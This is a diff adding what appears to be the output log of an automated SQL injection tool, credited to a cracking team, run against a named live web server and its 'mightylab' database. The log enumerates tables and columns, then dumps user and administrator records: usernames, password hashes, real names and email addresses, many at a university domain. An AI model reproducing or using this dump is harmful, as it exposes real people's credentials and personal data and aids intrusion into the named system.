@@ -1,0 +1,46 @@
+Cracked by Service Manual { Aluf Team }  
+Analyzing xxx with 1 input parameter(s)
+Test parameter: id
+Host IP: 75.119.220.217
+Web Server: Apache
+Keyword Found: crime
+Injection type is Integer
+DB Server: MySQL >=5
+Selected Column Count is 23
+Valid String Column is 4
+Current DB: mightylab
+Count(table_name) of information_schema.tables where table_schema=0x6D69676874796C6162 is 26
+Tables found: Announcements,Cartoons,Users,article_groups,ml_admin_modules,ml_admin_users,ml_contact_form_forms,ml_contact_form_users,ml_mailing_list_admin,ml_mailing_list_messages,ml_mailing_list_subscribers,ml_mailing_list_users,ml_publisher_articles,ml_publisher_comments,ml_publisher_debates,ml_publisher_essays,ml_publisher_issues,ml_publisher_notes,ml_publisher_responses,ml_publisher_sections,ml_publisher_settings,ml_publisher_users,ml_publisher_volumes,ml_webalizer_users,plro_content,symposia
+Count(column_name) of information_schema.columns where table_schema=0x6D69676874796C6162 and table_name=0x5573657273 is 7
+Columns found: Id,Username,Password,FirstName,LastName,Email,Active
+Count(*) of mightylab.Users is 2
+Data Found: Id,Username,Password,FirstName,LastName,Email,Active=7^mtelford^67962e6d7bfd9853^Matt^Telford^mtelford@law.upenn.edu^1
+Data Found: Id,Username,Password,FirstName,LastName,Email,Active=1^mkudzin^72936df72a689fbd^Matthew^Kudzin^mkudzin@cov.com^1
+Count(column_name) of information_schema.columns where table_schema=0x6D69676874796C6162 and table_name=0x6D6C5F61646D696E5F6D6F64756C6573 is 10
+Columns found: id,id_name,name,status,access,users_table,url,target,access_description,sort_order
+Count(column_name) of information_schema.columns where table_schema=0x6D69676874796C6162 and table_name=0x6D6C5F61646D696E5F7573657273 is 11
+Columns found: id,status,access,password,first_name,middle_name,last_name,suffix_name,username,email,phone
+Count(*) of mightylab.ml_admin_users is 10
+Data Found: id,password,first_name,middle_name,last_name,status,access=2^d0906840a7bfc2d7769c730f83e180a7^Justin^^Danilewitz^inactive^normal
+Data Found: id,password,first_name,middle_name,last_name,status,access=3^c0f96c87b3a385e46ee6a63385aef69c^Sonia^^Kothari^inactive^normal
+Data Found: id,password,first_name,middle_name,last_name,status,access=5^19accd327f8000bf940b8ebff2c988aa^sdf^^Assistasdfsdfnt^inactive^normal
+Data Found: id,password,first_name,middle_name,last_name,status,access=1^f150d697596a72bec6b0a03cf2e5704c^sd^^sdf^inactive^normal
+Data Found: id,password,first_name,middle_name,last_name,status,access=8^54427ecb9b41becb50b8c4719de7b91e^Matthew^^Kudzin^inactive^normal
+Data Found: id,password,first_name,middle_name,last_name,status,access=10^2f4ced6a1db0de21111c0ee48bd3144e^Terrakowski^s^s^inactive^master
+Data Found: id,password,first_name,middle_name,last_name,status,access=7^a08d951d77f0cf5089e50f9199ba16d6^Philip^^Mariani^inactive^normal
+Data Found: id,password,first_name,middle_name,last_name,status,access=6^8e258b217f074b5b408060e963a80492^Jonathan^^Kossak^inactive^normal
+Data Found: id,password,first_name,middle_name,last_name,status,access=4^fd26c65eb736e4f3616965be18f8a782^Max^^Polonsky^inactive^normal
+Data Found: id,password,first_name,middle_name,last_name,status,access=9^827ccb0eea8a706c4c34a16891f84e7b^smurfacc^^smurfacc^inactive^normal
+Count(*) of mightylab.ml_admin_users is 10
+Data Found: id,password,first_name,middle_name,last_name,status,access,email=2^d0906840a7bfc2d7769c730f83e180a7^Justin^^Danilewitz^inactive^normal^jdanilew@law.upenn.edu
+Data Found: id,password,first_name,middle_name,last_name,status,access,email=3^c0f96c87b3a385e46ee6a63385aef69c^Sonia^^Kothari^inactive^normal^kotharis@law.upenn.edu
+Data Found: id,password,first_name,middle_name,last_name,status,access,email=4^fd26c65eb736e4f3616965be18f8a782^Max^^Polonsky^inactive^normal^mpolonsk@law.upenn.edu
+Data Found: id,password,first_name,middle_name,last_name,status,access,email=7^a08d951d77f0cf5089e50f9199ba16d6^Philip^^Mariani^inactive^normal^marianip@law.upenn.edu
+Data Found: id,password,first_name,middle_name,last_name,status,access,email=8^54427ecb9b41becb50b8c4719de7b91e^Matthew^^Kudzin^inactive^normal^mkudzin@law.upenn.edu
+Data Found: id,password,first_name,middle_name,last_name,status,access,email=1^f150d697596a72bec6b0a03cf2e5704c^sd^^sdf^inactive^normal^luke@mightylab.com
+Data Found: id,password,first_name,middle_name,last_name,status,access,email=10^2f4ced6a1db0de21111c0ee48bd3144e^Terrakowski^s^s^inactive^master^Terracow@gmail.com
+Data Found: id,password,first_name,middle_name,last_name,status,access,email=5^19accd327f8000bf940b8ebff2c988aa^sdf^^Assistasdfsdfnt^inactive^normal^lawrev@lawfgfds.com
+Data Found: id,password,first_name,middle_name,last_name,status,access,email=9^827ccb0eea8a706c4c34a16891f84e7b^smurfacc^^smurfacc^inactive^normal^smurfacc@live.se
+Data Found: id,password,first_name,middle_name,last_name,status,access,email=6^8e258b217f074b5b408060e963a80492^Jonathan^^Kossak^inactive^normal^jdkossak@law.upenn.edu
+Count(column_name) of information_schema.columns where table_schema=0x6D69676874796C6162 and table_name=0x6D6C5F6D61696C696E675F6C6973745F61646D696E is 17
+Columns found: id,message_type,smtp_host,throttle_number,throttle_minutes,list_name,from_name,from_email,notification_emails,default_subject,header,footer,subscribe_intro,unsubscribe_intro,subscribe_message,subscribe_url,custom_form_fields_unrecorded
